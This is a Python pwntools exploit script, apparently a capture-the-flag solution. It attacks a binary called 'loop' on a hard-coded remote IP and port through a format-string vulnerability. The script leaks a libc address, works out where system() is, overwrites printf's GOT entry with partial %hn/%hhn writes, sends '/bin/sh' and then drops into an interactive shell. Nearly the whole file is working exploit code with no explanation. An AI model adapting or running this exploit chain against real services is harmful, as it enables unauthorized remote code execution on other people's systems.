from pwn import *

# DEBUG = True
DEBUG = False

if DEBUG:
    r = process("./loop")
    gdb.attach(r)
    libc_start_main_231 = 0x21bf7
    system_off = 0x000000000004f550
else:
    r = remote("103.229.41.18", 5556)
    libc_start_main_231 = 0x0000000000020830
    system_off = 0x0000000000045390
    # one_gadget = 0x45216

main = 0x400805
# loop = 0x0000000000400763
puts_got = 0x601018
printf_got = 0x601028
setvbuf_got = 0x601040

payload = "%23$2053p%14$hn-" # 12 13
payload += p64(puts_got)
r.sendline(payload)

# leak __libc_start_main+231
leak = r.recvuntil("-")[-13:-1]
leak = int(leak,16)
print(hex(leak))
# base = leak - libc_start_main_231 - 25 # adjust by -25
base = leak - libc_start_main_231

print(hex(base))
system = base + system_off
system = hex(system)
print(system)
system1 = int(system[-4:],16)
system2 = int(system[-6:-4],16)
print(hex(system1))
print(hex(system2))

payload = "%" + str(system2) + "p%16$hhn" # 12 13
off2 = 16-len(payload)
payload += off2*"-" # 12 13

r.sendline("/bin/sh\x00")

payload1 = "%" + str(system1-system2-off2) + "p%17$hn" # 14 15
payload1 += (16-len(payload1))*"-" # 14 15
payload1 += p64(printf_got+2) + p64(printf_got)
payload += payload1
r.sendline(payload)

r.sendline("/bin/sh")

r.interactive()